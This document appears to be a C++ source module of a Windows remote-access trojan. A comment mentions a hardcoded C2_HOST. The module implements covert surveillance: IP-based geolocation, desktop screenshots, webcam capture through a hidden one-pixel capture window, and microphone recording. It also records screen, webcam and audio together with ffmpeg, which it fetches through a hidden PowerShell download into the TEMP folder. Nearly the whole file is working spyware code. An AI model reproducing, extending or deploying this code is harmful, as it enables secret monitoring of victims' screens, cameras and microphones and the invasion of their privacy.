#include "recon.h"
#include "comms.h"
#include "utils.h"
#include "shell.h"
#include <windows.h>
#include <winhttp.h>
#include <vfw.h>
#include <mmsystem.h>
#include <fstream>
#include <cstdio>

// ============================================================================
// 1. Geolocation (IP-based via ipinfo.io)
// ============================================================================
std::string get_location() {
    std::string resp = http_get("/json"); // We need to route this to ipinfo.io, 
                                          // but http_get hardcodes C2_HOST.
    
    // Quick WinHTTP request specifically to ipinfo.io
    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", 
                                     WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, 
                                     WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return "Geolocation failed: WinHttpOpen error.";
    
    HINTERNET hConnect = WinHttpConnect(hSession, L"ipinfo.io", 443, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return "Geolocation failed: WinHttpConnect error."; }
    
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", L"/json", nullptr, 
                                            WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 
                                            WINHTTP_FLAG_SECURE);
    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return "Geolocation failed: WinHttpOpenRequest error."; }
    
    std::string result = "";
    if (WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0) &&
        WinHttpReceiveResponse(hRequest, nullptr)) {
        
        char buf[1024];
        DWORD bytesRead;
        while (WinHttpReadData(hRequest, buf, sizeof(buf), &bytesRead) && bytesRead > 0) {
            result.append(buf, bytesRead);
        }
    }
    
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    
    if (result.empty()) return "Geolocation failed: No response from ipinfo.io.";
    
    // Parse the JSON
    std::string loc = json_get(result, "loc");
    std::string ip = json_get(result, "ip");
    std::string city = json_get(result, "city");
    std::string country = json_get(result, "country");
    
    return "Source: IP-based (INACCURATE)\nIP: " + ip + "\nLocation: " + city + ", " + country + 
           "\nCoords: " + loc + "\nMaps: https://maps.google.com/?q=" + loc;
}

// ============================================================================
// 2. Screenshot (GDI API)
// ============================================================================
std::string take_screenshot() {
    std::string filepath = std::string(getenv("TEMP")) + "\\s.bmp";
    
    int x1 = GetSystemMetrics(SM_XVIRTUALSCREEN);
    int y1 = GetSystemMetrics(SM_YVIRTUALSCREEN);
    int x2 = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    int y2 = GetSystemMetrics(SM_CYVIRTUALSCREEN);
    int w = x2 - x1;
    int h = y2 - y1;

    HDC hScreen = GetDC(nullptr);
    HDC hDC = CreateCompatibleDC(hScreen);
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, w, h);
    HGDIOBJ old_obj = SelectObject(hDC, hBitmap);
    
    BitBlt(hDC, 0, 0, w, h, hScreen, x1, y1, SRCCOPY);
    
    // Save to BMP file
    BITMAP bmpAttr;
    GetObject(hBitmap, sizeof(BITMAP), &bmpAttr);
    BITMAPINFOHEADER bi = { sizeof(BITMAPINFOHEADER), bmpAttr.bmWidth, bmpAttr.bmHeight, 1, 32, BI_RGB };
    
    DWORD dwBmpSize = ((bmpAttr.bmWidth * bi.biBitCount + 31) / 32) * 4 * bmpAttr.bmHeight;
    HANDLE hDIB = GlobalAlloc(GHND, dwBmpSize);
    char* lpbitmap = (char*)GlobalLock(hDIB);
    
    GetDIBits(hScreen, hBitmap, 0, (UINT)bmpAttr.bmHeight, lpbitmap, (BITMAPINFO*)&bi, DIB_RGB_COLORS);
    
    HANDLE hFile = CreateFileA(filepath.c_str(), GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hFile != INVALID_HANDLE_VALUE) {
        DWORD dwSizeofDIB = dwBmpSize + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
        BITMAPFILEHEADER bmfHeader;
        bmfHeader.bfOffBits = (DWORD)sizeof(BITMAPFILEHEADER) + (DWORD)sizeof(BITMAPINFOHEADER);
        bmfHeader.bfSize = dwSizeofDIB;
        bmfHeader.bfType = 0x4D42; // "BM"
        
        DWORD dwBytesWritten = 0;
        WriteFile(hFile, (LPSTR)&bmfHeader, sizeof(BITMAPFILEHEADER), &dwBytesWritten, nullptr);
        WriteFile(hFile, (LPSTR)&bi, sizeof(BITMAPINFOHEADER), &dwBytesWritten, nullptr);
        WriteFile(hFile, (LPSTR)lpbitmap, dwBmpSize, &dwBytesWritten, nullptr);
        CloseHandle(hFile);
    } else {
        filepath = ""; // Failed
    }
    
    GlobalUnlock(hDIB);
    GlobalFree(hDIB);
    SelectObject(hDC, old_obj);
    DeleteObject(hBitmap);
    DeleteDC(hDC);
    ReleaseDC(nullptr, hScreen);
    
    return filepath;
}

// ============================================================================
// 3. Webcam (VFW API - Video for Windows)
// ============================================================================
std::string take_webcam_photo() {
    std::string filepath = std::string(getenv("TEMP")) + "\\c.bmp";
    
    // Create a hidden capture window
    HWND hCam = capCreateCaptureWindowA("wc", WS_POPUP, 0, 0, 1, 1, HWND_DESKTOP, 0);
    if (!hCam) return "";
    
    // Connect to driver index 0
    if (SendMessageA(hCam, WM_CAP_DRIVER_CONNECT, 0, 0)) {
        // Grab a frame
        SendMessageA(hCam, WM_CAP_GRAB_FRAME, 0, 0);
        
        // Save to BMP
        SendMessageA(hCam, WM_CAP_FILE_SAVEDIBA, 0, (LPARAM)filepath.c_str());
        
        // Disconnect
        SendMessageA(hCam, WM_CAP_DRIVER_DISCONNECT, 0, 0);
        DestroyWindow(hCam);
        return filepath;
    }
    
    DestroyWindow(hCam);
    return ""; // Failed to connect to webcam
}

// ============================================================================
// 4. Audio Record (MCI API - Media Control Interface)
// ============================================================================
std::string record_audio(int seconds) {
    std::string filepath = std::string(getenv("TEMP")) + "\\a.wav";
    
    // Clean up if temp file exists
    if (std::ifstream(filepath)) { remove(filepath.c_str()); }
    
    // Open new audio channel
    mciSendStringA("open new type waveaudio alias rec", nullptr, 0, nullptr);
    
    // Configure recording quality (optional, improves clarity)
    mciSendStringA("set rec bitspersample 16", nullptr, 0, nullptr);
    mciSendStringA("set rec samplespersec 44100", nullptr, 0, nullptr);
    mciSendStringA("set rec channels 2", nullptr, 0, nullptr);
    
    // Start recording
    mciSendStringA("record rec", nullptr, 0, nullptr);
    
    // Wait
    Sleep(seconds * 1000);
    
    // Stop and save
    mciSendStringA("stop rec", nullptr, 0, nullptr);
    std::string save_cmd = "save rec \"" + filepath + "\"";
    mciSendStringA(save_cmd.c_str(), nullptr, 0, nullptr);
    mciSendStringA("close rec", nullptr, 0, nullptr);
    
    std::ifstream fchk(filepath);
    if (fchk.good()) return filepath;
    
    return ""; // Recording failed
}

// ============================================================================
// 5. FFmpeg Automation Helper
// ============================================================================
static std::string get_ffmpeg() {
    std::string temp_dir = std::string(getenv("TEMP"));
    std::string ffmpeg_dir = temp_dir + "\\ffmpeg_bin";
    std::string ffmpeg_exe = ffmpeg_dir + "\\ffmpeg.exe";
    
    WIN32_FIND_DATAA fd;
    if (FindFirstFileExA(ffmpeg_exe.c_str(), FindExInfoStandard, &fd, FindExSearchNameMatch, NULL, 0) != INVALID_HANDLE_VALUE) {
        return ffmpeg_exe;
    }
    
    // Download and extract via PowerShell
    CreateDirectoryA(ffmpeg_dir.c_str(), nullptr);
    std::string ps = "powershell.exe -WindowStyle Hidden -NoProfile -Command \"Invoke-WebRequest -Uri 'https://github.com/BtbN/FFmpeg-Builds/releases/download/latest/ffmpeg-master-latest-win64-gpl.zip' -OutFile '"+ffmpeg_dir+"\\ff.zip'; Expand-Archive -Path '"+ffmpeg_dir+"\\ff.zip' -DestinationPath '"+ffmpeg_dir+"\\ext' -Force; Copy-Item '"+ffmpeg_dir+"\\ext\\*\\bin\\ffmpeg.exe' -Destination '"+ffmpeg_exe+"' -Force; Remove-Item '"+ffmpeg_dir+"\\ff.zip' -Force; Remove-Item '"+ffmpeg_dir+"\\ext' -Recurse -Force\"";
    
    Shell shell;
    shell.execute(ps);
    
    if (FindFirstFileExA(ffmpeg_exe.c_str(), FindExInfoStandard, &fd, FindExSearchNameMatch, NULL, 0) != INVALID_HANDLE_VALUE) {
        return ffmpeg_exe;
    }
    return "";
}

static std::string find_audio_device(const std::string& ffmpeg_exe, const std::string& search_term) {
    Shell shell;
    std::string out = shell.execute("\"" + ffmpeg_exe + "\" -list_devices true -f dshow -i dummy 2>&1");
    // Simple naive parsing: find "DirectShow audio devices"
    size_t pos = out.find("DirectShow audio devices");
    if (pos == std::string::npos) return "";
    
    size_t searchPos = out.find(search_term, pos);
    if (searchPos != std::string::npos) {
        // go back to find the closest starting quote
        size_t quoteStart = out.rfind('"', searchPos);
        if (quoteStart != std::string::npos) {
            size_t quoteEnd = out.find('"', searchPos);
            if (quoteEnd != std::string::npos && quoteEnd > quoteStart) {
                return out.substr(quoteStart + 1, quoteEnd - quoteStart - 1);
            }
        }
    }
    // fallback first mic
    size_t quote1 = out.find('"', pos);
    if (quote1 != std::string::npos) {
        size_t quote2 = out.find('"', quote1 + 1);
        if (quote2 != std::string::npos) {
            return out.substr(quote1 + 1, quote2 - quote1 - 1);
        }
    }
    return "";
}

// ============================================================================
// 6. Video Recording (rec_v)
// ============================================================================
std::string record_video(int seconds, const std::string& mode) {
    std::string ffmpeg = get_ffmpeg();
    if (ffmpeg.empty()) return ""; // Failed to get ffmpeg
    
    std::string filepath = std::string(getenv("TEMP")) + "\\v.mp4";
    if (std::ifstream(filepath)) remove(filepath.c_str());
    
    std::string cmd;
    if (mode == "screen") {
        cmd = "\"" + ffmpeg + "\" -y -f gdigrab -framerate 15 -i desktop -c:v libx264 -preset ultrafast -t " + std::to_string(seconds) + " \"" + filepath + "\"";
    } else {
        cmd = "\"" + ffmpeg + "\" -y -f dshow -i video=\"Integrated Camera\" -c:v libx264 -preset ultrafast -t " + std::to_string(seconds) + " \"" + filepath + "\""; 
        // Note: Target webcam name can vary. 'Integrated Camera' is common. A robust version would parse dshow video devices like audio.
    }
    
    Shell shell;
    shell.execute(cmd);
    
    if (std::ifstream(filepath)) return filepath;
    return "";
}

// ============================================================================
// 7. AV Sync Recording (record)
// ============================================================================
std::string record_av(int seconds, const std::string& mode) {
    std::string ffmpeg = get_ffmpeg();
    if (ffmpeg.empty()) return "";
    
    std::string filepath = std::string(getenv("TEMP")) + "\\av_sync.mp4";
    if (std::ifstream(filepath)) remove(filepath.c_str());
    
    std::string mic = find_audio_device(ffmpeg, "");
    if (mic.empty()) mic = "Microphone";
    
    std::string cmd = "\"" + ffmpeg + "\" -y -f gdigrab -framerate 15 -i desktop ";
    if (mode == "full") {
        std::string stereo = find_audio_device(ffmpeg, "Stereo Mix");
        if (!stereo.empty()) {
            cmd += "-f dshow -i audio=\"" + mic + "\" -f dshow -i audio=\"" + stereo + "\" ";
            cmd += "-filter_complex \"[1:a][2:a]amix=inputs=2[a]\" -map 0:v -map \"[a]\" ";
        } else {
            return ""; // Full rejected
        }
    } else {
        cmd += "-f dshow -i audio=\"" + mic + "\" -map 0:v -map 1:a ";
    }
    
    cmd += "-c:v libx264 -preset ultrafast -t " + std::to_string(seconds) + " \"" + filepath + "\"";
    
    Shell shell;
    shell.execute(cmd);
    
    if (std::ifstream(filepath)) return filepath;
    return "";
}
